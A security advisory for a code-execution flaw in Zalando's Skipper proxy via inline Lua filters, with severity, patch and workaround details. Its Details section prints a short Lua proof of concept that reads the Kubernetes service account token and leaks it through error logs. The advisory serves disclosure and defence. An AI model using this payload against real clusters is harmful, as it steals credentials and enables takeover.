# [H] Skipper is vulnerable to arbitrary code execution through lua filters

## Summary
Severity: High
Advisory: GHSA-cc8m-98fm-rc9g
CVE: CVE-2026-23742
CWE: CWE-250, CWE-522, CWE-94
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-16
Source: https://github.com/advisories/GHSA-cc8m-98fm-rc9g
Type: github-advisory

## Affected
- Go: `github.com/zalando/skipper` — affected >=0 <0.23.0

## Details
### Impact

Arbitrary code execution through [lua filters](https://opensource.zalando.com/skipper/reference/scripts/).

The default skipper configuration before v0.23 was `-lua-sources=inline,file`. 
The problem starts if untrusted users can create lua filters, because of `-lua-sources=inline` , for example through a Kubernetes Ingress resource. The configuration `inline` allows these user to create a script that is able to read the filesystem accessible to the skipper process and if the user has access to read the logs they an read skipper secrets.

Kubernetes example (vulnerability is not limited to Kubernetes)
```lua
function request(ctx, params)
  local file = io.open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r')
  if file then
    local token = file:read('*all')
    file:close()
    error('[EXFIL] ' .. token)  -- Exfiltrate via error logs
  end
end
```

### Patches

https://github.com/zalando/skipper/releases/tag/v0.23.0 disables Lua by default.

### Workarounds

You can reduce support of how you can pass lua filter script data by providing config for lua sources https://opensource.zalando.com/skipper/reference/scripts/#enable-and-disable-lua-sources. For example `-lua-sources=file` will only be exploitable if the attacker can create a lua script file on the target system. 

### References

https://opensource.zalando.com/skipper/reference/scripts/#enable-and-disable-lua-sources

## References
- https://github.com/zalando/skipper/security/advisories/GHSA-cc8m-98fm-rc9g
- https://nvd.nist.gov/vuln/detail/CVE-2026-23742
- https://github.com/zalando/skipper/commit/0b52894570773b29e2f3c571b94b4211ef8fa714
- https://github.com/zalando/skipper
- https://github.com/zalando/skipper/releases/tag/v0.23.0
